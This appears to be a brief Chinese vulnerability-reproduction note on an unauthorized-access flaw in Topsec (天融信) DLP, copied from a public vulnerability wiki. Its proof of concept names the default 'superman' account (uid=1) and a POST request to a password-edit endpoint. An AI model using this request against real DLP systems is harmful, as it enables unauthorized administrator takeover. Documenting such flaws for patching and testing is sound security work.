---
title: "天融信 DLP 未授权访问漏洞"
date: 2026-10-16 09:10:30
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "天融信"
tags:
  - "天融信"
  - "未授权访问"
  - "漏洞复现"
---
## 漏洞描述

天融信DLP存在未授权访问漏洞

## 漏洞影响

```
天融信DLP
```

## 漏洞复现

POC为

```plain
默认用户superman的uid=1
POST /?module-auth_user&action=mod_edit.pwd HTTP/1.1
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E5%A4%A9%E8%9E%8D%E4%BF%A1-DLP-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md)
